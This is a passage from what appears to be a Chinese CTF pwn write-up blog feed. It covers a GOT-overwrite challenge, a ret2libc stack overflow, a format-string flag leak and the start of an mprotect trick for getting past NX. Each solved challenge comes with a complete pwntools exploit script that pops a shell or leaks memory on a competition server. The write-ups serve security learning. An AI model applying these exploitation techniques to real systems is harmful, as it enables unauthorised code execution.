&quot;</span>)<br>    ioTube.sendline(<span class="hljs-string">b&quot;protect &quot;</span>+<span class="hljs-string">b&#x27;FLAG&#x27;</span>)<br><br>ioTube.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>ioTube.sendline(<span class="hljs-string">b&quot;print &quot;</span>+<span class="hljs-string">b&#x27;FLAG=&#x27;</span>)<br>response=ioTube.recvuntil(<span class="hljs-string">&#x27;t&#x27;</span>).decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br>response=response[<span class="hljs-number">5</span>:]<br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> response:<br>    flag+=Decrypt(item,rotTimes)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(flag))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>比赛题解</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2025-09-06-ImaginaryCTF-addition</title>
    <link href="/2025/09/09/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-09-06-ImaginaryCTF-addition/"/>
    <url>/2025/09/09/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-09-06-ImaginaryCTF-addition/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>ImaginaryCTF上pwn第二题，原题见：<a href="https://2025.imaginaryctf.org/Challenges.html">ImaginaryCTF-addition</a></p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先固定节目，checksec看保护，如图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-09-06-ImaginaryCTF-addition/checksec.png"><br>可以看到开启了PIE和NX，且Partial RELRO，表示GOT表部分可写，没有canary<br>接下来进入IDA分析，只有一个main函数，如图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-09-06-ImaginaryCTF-addition/IDA-main.png"><br>分析发现main函数中无明显溢出点，同时也程序中也没有后门函数<br><br>但是我们注意到main函数提供了无限次的对buf变量的几乎任意偏移处写入的机会（除了&amp;buf+1337处不允许写入）<br><br>此时双击buf变量，观察到其位于bss段，因此程序实际上提供了任意地址写的机会<br><br>此时首先想到的是利用上述的地址写能力去控返回地址<br><br>但是仔细分析之下发现，很难泄露栈地址，同时main函数最后并不是以ret指令结尾，即使控了栈大概率也不行<br><br>这时想到函数的GOT表实际上也是存储于程序区段中，可以通过bss+偏移的手段访问到，因此漏洞点确定，应该就是利用任意地址写取覆盖某个函数的GOT表<br><br>但是具体应该覆盖哪个函数？这个问题没有太好的公式化打法，目前感觉只能靠观察<br><br>首先，目标是调用system，因此参数个数不一致的不是好的选择，不然还要控参；其次优先选择参数便于控制的，最容易控制的是什么？当然是我们的输入<br><br>至此，可以确定，最简便的办法是在第一次循环的时候覆盖掉atoll函数的got表为system，第二次循环的add where之后输入”&#x2F;bin&#x2F;sh”，此时即可getshell</p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>具体攻击时，分两个阶段：<br><br>第一，把atoll的GOT表项的地址相对buf的偏移在add where提示后输入；接着输入system函数在libc里的偏移-atoll在libc里的偏移，这样在add what相加后GOT表atoll的真实地址就变成system的真实地址了<br><br>最终的利用脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86_64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>libcPath=<span class="hljs-string">&quot;./libc.so.6&quot;</span><br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br>LOCAL=<span class="hljs-number">1</span><br>REMOTE=<span class="hljs-number">2</span><br>DEBUG=<span class="hljs-number">3</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Lauch</span>(<span class="hljs-params">mode=LOCAL</span>):<br>    <span class="hljs-keyword">if</span> mode==LOCAL:<br>        io=process(targetELF)<br>    <span class="hljs-keyword">elif</span> mode==REMOTE:<br>        io=remote(<span class="hljs-string">&quot;addition.chal.imaginaryctf.org&quot;</span>,<span class="hljs-number">1337</span>)<br>    <span class="hljs-keyword">elif</span> mode==DEBUG:<br>        io=gdb.debug(targetELF)<br>    <span class="hljs-keyword">return</span> io<br><br>elf=ELF(targetELF)<br>libc=ELF(libcPath)<br>atollGOT=elf.got[<span class="hljs-string">&quot;atoll&quot;</span>]<br>bufOffset=<span class="hljs-number">0x4069</span><br>targetAddr=atollGOT-bufOffset<br>atollLibc=libc.symbols[<span class="hljs-string">&quot;atoll&quot;</span>]<br>systemLibc=libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>libcOffset=systemLibc-atollLibc<br><br>ioTube=Lauch(REMOTE)<br>ioTube.recvuntil(<span class="hljs-string">&quot;add where? &quot;</span>)<br>ioTube.sendline(<span class="hljs-built_in">str</span>(targetAddr))<br>ioTube.recvuntil(<span class="hljs-string">&quot;add what? &quot;</span>)<br>ioTube.sendline(<span class="hljs-built_in">str</span>(libcOffset))<br><br>ioTube.recvuntil(<span class="hljs-string">&quot;add where? &quot;</span>)<br>ioTube.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br>ioTube.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>其他技巧类</category>
      
      <category>覆写GOT表</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2025.09.04-NullconCTFBerlin-Fotispy1</title>
    <link href="/2025/09/05/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-09-04-NullconCTFBerlin-Fotispy1/"/>
    <url>/2025/09/05/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-09-04-NullconCTFBerlin-Fotispy1/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>赛题链接见：<a href="https://ctf.nullcon.net/challenges#Fotispy%201-112">2025-09-04 NullconCTFBerlin fotispy1</a></p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>题目给了一个ELF、一个.so和一个ld，所以首先用patchelf修改程序对应的libc和ld<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">patchelf --set-interpreter ~/Pwn/2025-09-04-CTF/ld-linux-x86-64.so.2 ./pwn<br>patchelf --replace-needed libc.so.6 ~/Pwn/2025-09-04-CTF/libc.so.6 ./pwn<br></code></pre></td></tr></table></figure><p>如图，替换成功后才能开始分析<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-09-04-NullconCTFBerlin-Fotispy1/patchelf.png"><br>之后运行程序，发现是一个菜单类型程序，提供了注册、登录、添加、显示四大功能，经过尝试发现必须注册、登录后才能添加歌曲<br><br>再checksec看一下，发现只开了NX：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-09-04-NullconCTFBerlin-Fotispy1/checksec.png"><br>然后拖进IDA看一下，首先观察main函数，这里先把main里一些重要函数和变量重命名成人类可读的形式，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-09-04-NullconCTFBerlin-Fotispy1/IDA-main.png"><br>初步观察一下IDA左侧的plt表，不存在free函数，因此大概率和堆利用无关，是一个溢出题，所以要寻找溢出点<br><br>因此重点排查各个输入函数，看有没有溢出，首先看程序自制的读取输入函数get_input，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-09-04-NullconCTFBerlin-Fotispy1/IDA-get_input.png"><br>第一眼看过去怀疑有off-by-one，但是代入程序中的maxSize参数&#x3D;256计算一下，并结合deepseek分析，发现limit设置的没问题，没办法溢出<br><br>再回到main函数，分析reg和login函数，首先看注册函数：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-09-04-NullconCTFBerlin-Fotispy1/IDA-reg-stripped.png"><br>注意到上图的17、18行username和passwd的存储位置，一个在qword_4040A0+v3，一个在它后面8个字节，分析得出username和passwd大概率是一个结构体类型<br><br>同时每一个结构体都存储在位于0x4040A0的一个数组类型的全局变量里<br><br>综合上述信息可以把reg函数变得更加可读一些，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-09-04-NullconCTFBerlin-Fotispy1/IDA-reg.png"><br>然而进一步分析发现并没有什么可用的溢出点，只是当username输入过长时会把后半部分当作passwd存起来，但好像对我们控rip并没什么用？<br><br>再看loging函数，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-09-04-NullconCTFBerlin-Fotispy1/IDA-login.png"><br>发现calloc的大小完全超过了get_input设定的最大大小，因此这里也没有可用的溢出点<br><br>接着看add函数，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-09-04-NullconCTFBerlin-Fotispy1/IDA-add-stripped.png"><br>结合之前运行程序的输出，以printf的交互信息作为线索，可以依次恢复v7、v8、v9的含义，并且结合猜出user结构体的经验，可以大胆猜测歌曲的title、who和album三个信息是存储在某个结构体里的<br><br>综上，得到可读的add函数如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-09-04-NullconCTFBerlin-Fotispy1/IDA-add.png"><br>但是，这个函数貌似也没有栈溢出？最有用的是泄露了一个printf函数的地址，现在我们因此有了关于libc的一切<br><br>最后只能看show函数了，有了分析add函数的经验，可以很容易恢复show函数的可读信息，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-09-04-NullconCTFBerlin-Fotispy1/IDA-show.png"><br>但是，show函数里没有输入的交互点，看起来没有溢出？<br><br>不，注意到memcpy的拷贝大小实际是我们可控的，因为在add里面，我们输入的title、who和album三个成员的大小是由get_input返回的，最大可到256，但是dest距离返回地址只有0x15+0x8个字节，远远小于256，因此show函数里面存在溢出<br><br>综上，利用思路为：利用2号功能输入payload，调用3号功能劫持show函数的返回地址从而ret2libc</p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>利用时还存在两个注意点：<br><br>第一，注意到show函数在走到ret指令之前会对rax解引用一次，而通过调试发现这个rax的值来自rbp-8，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-09-04-NullconCTFBerlin-Fotispy1/rax-rbp.png"><br>因此要控制rbp-8的值为可解析的地址，这里首先想到把printf的地址喂给rax，但这样会导致另一个问题：下面的jne指令会跳转从而到不了ret<br><br>因此第二个注意点即不仅要保证rbp-8有效，而且那个地址里的内容必须是0<br><br>这里通过vmmap查看程序区段，去bss段里面找0字节（因为程序的bss段一般会初始化&#x3D;0），如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-09-04-NullconCTFBerlin-Fotispy1/vmmap-0.png"><br>可以看到有很多地址里面有0字节，这里随便选择一个即可<br><br>综上，写出利用脚本如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br>targetLibc=<span class="hljs-string">&quot;./libc.so.6&quot;</span><br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86_64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><span class="hljs-comment"># context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span><br>LOCAL=<span class="hljs-number">1</span><br>REMOTE=<span class="hljs-number">2</span><br>DEBUG=<span class="hljs-number">3</span><br>prompt=<span class="hljs-string">&quot;Please enter your choice [E]: &quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Lauch</span>(<span class="hljs-params">mode=LOCAL</span>):<br>    <span class="hljs-keyword">if</span> mode==LOCAL:<br>        ioTube=process(targetELF)<br>    <span class="hljs-keyword">elif</span> mode==REMOTE:<br>        ioTube=remote(<span class="hljs-string">&quot;52.59.124.14&quot;</span>,<span class="hljs-number">5191</span>)<br>    <span class="hljs-keyword">elif</span> mode==DEBUG:<br>        ioTube=gdb.debug(targetELF,<span class="hljs-string">&quot;b *0x401997&quot;</span>)<br>    <span class="hljs-keyword">return</span> ioTube<br><br>ioTube=Lauch(REMOTE)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Register</span>():<br>    ioTube.recvuntil(prompt)<br>    ioTube.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;[~] Please enter a username: &quot;</span>)<br>    ioTube.sendline(<span class="hljs-string">&quot;admin&quot;</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;~] Please enter a password: &quot;</span>)<br>    ioTube.sendline(<span class="hljs-string">&quot;12345&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Login</span>():<br>    ioTube.recvuntil(prompt)<br>    ioTube.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;[~] Please enter a username: &quot;</span>)<br>    ioTube.sendline(<span class="hljs-string">&quot;admin&quot;</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;[~] Please enter a password: &quot;</span>)<br>    ioTube.sendline(<span class="hljs-string">&quot;12345&quot;</span>)<br><br><br>Register()<br>Login()<br>ioTube.recvuntil(prompt)<br>ioTube.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;[DEBUG] 0x&quot;</span>)<br>printfReal=<span class="hljs-built_in">int</span>(ioTube.recvline()[:-<span class="hljs-number">1</span>].decode(),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;leak.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(<span class="hljs-built_in">hex</span>(printfReal))<br><br>ioTube.recvuntil(<span class="hljs-string">&quot;[~] Please enter a song title: &quot;</span>)<br>ioTube.sendline(<span class="hljs-string">&quot;AAA&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;[~] Please enter a who AAA is from: &quot;</span>)<br>ioTube.sendline(<span class="hljs-string">&quot;BBB&quot;</span>)<br><br>ioTube.recvuntil(<span class="hljs-string">&quot;[~] Please enter which album AAA is on: &quot;</span>)<br><br>offset=<span class="hljs-number">29</span><br>libc=ELF(targetLibc)<br>libcBase=printfReal-libc.symbols[<span class="hljs-string">&quot;printf&quot;</span>]<br><br>retAlignPadding=<span class="hljs-number">0x40101a</span><br><br>sysAddr=libcBase+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>binshAddr=libcBase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br>pop_rdi=libcBase+<span class="hljs-number">0x277e5</span><br>payload2=<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">13</span>+p64(<span class="hljs-number">0x4041A0</span>)*<span class="hljs-number">2</span>+p64(retAlignPadding)+p64(pop_rdi)+p64(binshAddr)+p64(sysAddr)<br><br>ioTube.sendline(payload2)<br>ioTube.recvuntil(prompt)<br>ioTube.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>ioTube.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>比赛题解</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2025.08.09-Simple-AI-Bot</title>
    <link href="/2025/08/11/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025-08-09-Simple-AI-Bot/"/>
    <url>/2025/08/11/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025-08-09-Simple-AI-Bot/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>2025年8月9日的WHY2025 CTF赛题，链接在这<a href="https://ctf.why2025.org/challenges">WHY2025 CTF: Simple-AI-Bot</a><br></p><span id="more"></span><p>个人觉得很难的一道题目，需要盲打，一开始完全没思路……</p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先拿到题目，发现没有任何附件，需要盲打，这里就卡住了，后来队友提示需要利用格式化字符串漏洞+有一个flag交互选项才知道怎么做<br><br>具体来说，首先监听给的端口，如图，注意到（其实就是瞎猜，我愿称我哥们为拉马努金……）输入包含flag的字符串就可以让机器人返回flag的地址：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025.08.09-Simple-AI-Bot/flag-prompt.png"><br>接下来既然我的拉马努金队友说了是格式化字符串，那就用%p测试一下，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025.08.09-Simple-AI-Bot/fmt-test.png"><br>可以看到会输出一些0x巴拉巴拉的地址，说明存在格式化字符串漏洞<br><br>经过上述分（瞎）析（猜），可以确定漏洞点即 <em><strong>泄露flag存储位置+格式化字符串输出</strong></em> 这一思路<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先确定输入的内容在printf时是位于第几个参数，如图，通过tag%p%p%p……%p来确定：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025.08.09-Simple-AI-Bot/offset.png"><br>然后肉眼数一下有几个0x，发现到输入的1序列（即0x31）有6个0x，因此输入最终会被放在第6个参数<br><br>然后写出如下的利用脚本：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br><br>ioTube=remote(<span class="hljs-string">&quot;simple-ai-bot.ctf.zone&quot;</span>,<span class="hljs-number">4242</span>)<br><br>ioTube.recvuntil(<span class="hljs-string">&quot;Hi, what can I help you with today?\n&gt; &quot;</span>)<br>ioTube.sendline(<span class="hljs-string">&quot;flag&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;The flag is safely stored in 0x&quot;</span>)<br>flagAddr=<span class="hljs-built_in">int</span>(ioTube.recvline()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>ioTube.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br><br>ioTube.sendline(p64(flagAddr)+<span class="hljs-string">b&quot;%6$s&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;I&#x27;m sorry, I don&#x27;t know about: &quot;</span>)<br>flag=ioTube.recv().decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag is here:&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(flag))<br></code></pre></td></tr></table></figure><p>但是，这个exp并不能打通，原因是没有注意到NULL字节会截断printf的格式化字符串，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025.08.09-Simple-AI-Bot/NULL-Byte-Error.png"><br>可以看到泄露的地址只有6个字节，p64打包时会引入0字节，导致后面的%6$s不会被printf识别，因此要把格式字符放在前面，不过这样的话偏移要+1变成7，如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br><br>ioTube=remote(<span class="hljs-string">&quot;simple-ai-bot.ctf.zone&quot;</span>,<span class="hljs-number">4242</span>)<br><br>ioTube.recvuntil(<span class="hljs-string">&quot;Hi, what can I help you with today?\n&gt; &quot;</span>)<br>ioTube.sendline(<span class="hljs-string">&quot;flag&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;The flag is safely stored in 0x&quot;</span>)<br>flagAddr=<span class="hljs-built_in">int</span>(ioTube.recvline()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>ioTube.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br><br>ioTube.sendline(<span class="hljs-string">b&quot;%7$s&quot;</span>+<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">4</span>+p64(flagAddr))<br>ioTube.recvuntil(<span class="hljs-string">&quot;I&#x27;m sorry, I don&#x27;t know about: &quot;</span>)<br>flag=ioTube.recv().decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag is here:&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(flag))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>格式化字符串</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>mprotect技巧</title>
    <link href="/2025/08/08/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/mprotect%E6%8A%80%E5%B7%A7/"/>
    <url>/2025/08/08/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/mprotect%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>题目背景见<a href="https://0x4a-210.github.io/2025/08/07/Questions/%E6%AD%A3%E5%B8%B8exit%E9%97%AE%E9%A2%98/">正常exit问题</a><br></p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>常规的分析不再赘述，这里主要记录一下这道题的另一个解法，也是一个NX保护开启情况下依然可以ret2shellcode的技巧<br><br>从上述链接的分析中可以看到程序开启了NX保护，按照常理来说基本不可能采用ret2shellcode的解法<br><br>但是发现这是一个静态编译的文件：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/mprotect%E6%8A%80%E5%B7%A7/file.png"><br>这里就想到大概率有mprotect函数，果不其然在IDA的Exports表里搜索到了mprotect函数，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/mprotect%E6%8A%80%E5%B7%A7/IDA-find_mprotect.png"><br>因此可以使用该函数破坏NX的保护，完成ret2shellcode<br><br>mprotect函数原理详见<a 